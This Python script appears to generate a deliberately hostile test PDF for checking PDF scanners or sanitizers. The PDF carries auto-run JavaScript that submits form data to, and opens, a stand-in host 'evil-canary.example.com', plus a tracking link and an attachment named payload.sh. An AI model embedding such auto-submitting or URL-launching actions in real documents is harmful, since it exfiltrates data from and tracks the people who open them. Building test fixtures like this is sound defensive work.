#!/usr/bin/env python3
"""Builds a deliberately hostile (but harmless to render) test PDF containing:
- /OpenAction with JavaScript
- a /Link annotation with an external /URI (canary-style)
- an /EmbeddedFile attachment
- an /AcroForm text field
- an additional-actions (/AA) page-open JavaScript
All uncompressed so features are grep-able in the raw file.
"""
import sys

objects = []

def add(body: bytes) -> int:
    objects.append(body)
    return len(objects)

# Content stream: visible text so rendering can be verified.
content = b"""BT /F1 24 Tf 72 700 Td (EVIL TEST PDF - Seite 1) Tj ET
BT /F1 14 Tf 72 660 Td (Dieses PDF enthaelt JavaScript, Links und Anhaenge.) Tj ET
BT /F1 14 Tf 72 620 Td (Klickbarer Canary-Link unten links.) Tj ET"""
stream = b"<< /Length %d >>\nstream\n%s\nendstream" % (len(content), content)

font = add(b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")
content_obj = add(stream)

js_open = add(b"<< /S /JavaScript /JS (app.alert\\(\"pwned on open\"\\); this.submitForm\\(\"http://evil-canary.example.com/submit\"\\);) >>")
js_page = add(b"<< /S /JavaScript /JS (app.launchURL\\(\"http://evil-canary.example.com/pageopen\", true\\);) >>")

link_annot = add(
    b"<< /Type /Annot /Subtype /Link /Rect [72 100 300 130] /Border [0 0 0] "
    b"/A << /S /URI /URI (http://evil-canary.example.com/tracking-pixel?id=42) >> >>"
)

attachment_data = b"echo this-could-be-anything"
ef_stream = add(b"<< /Type /EmbeddedFile /Length %d >>\nstream\n%s\nendstream" % (len(attachment_data), attachment_data))
filespec = add(b"<< /Type /Filespec /F (payload.sh) /EF << /F %d 0 R >> >>" % ef_stream)

field = add(
    b"<< /FT /Tx /T (secretfield) /V (form-data) /Type /Annot /Subtype /Widget "
    b"/Rect [72 200 300 230] >>"
)

page = add(
    b"<< /Type /Page /Parent PAGES 0 R /MediaBox [0 0 612 792] "
    b"/Resources << /Font << /F1 %d 0 R >> >> /Contents %d 0 R "
    b"/Annots [%d 0 R %d 0 R] /AA << /O %d 0 R >> >>" % (font, content_obj, link_annot, field, js_page)
)
pages = add(b"<< /Type /Pages /Kids [%d 0 R] /Count 1 >>" % page)
names = add(b"<< /EmbeddedFiles << /Names [(payload.sh) %d 0 R] >> >>" % filespec)
catalog = add(
    b"<< /Type /Catalog /Pages %d 0 R /OpenAction %d 0 R "
    b"/Names %d 0 R /AcroForm << /Fields [%d 0 R] >> >>" % (pages, js_open, names, field)
)

out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
offsets = [0]
for i, body in enumerate(objects, start=1):
    body = body.replace(b"PAGES 0 R", b"%d 0 R" % pages)
    offsets.append(len(out))
    out += b"%d 0 obj\n%s\nendobj\n" % (i, body)

xref_pos = len(out)
out += b"xref\n0 %d\n" % (len(objects) + 1)
out += b"0000000000 65535 f \n"
for off in offsets[1:]:
    out += b"%010d 00000 n \n" % off
out += b"trailer\n<< /Size %d /Root %d 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (len(objects) + 1, catalog, xref_pos)

with open(sys.argv[1], "wb") as f:
    f.write(out)
print(f"wrote {sys.argv[1]} ({len(out)} bytes)")
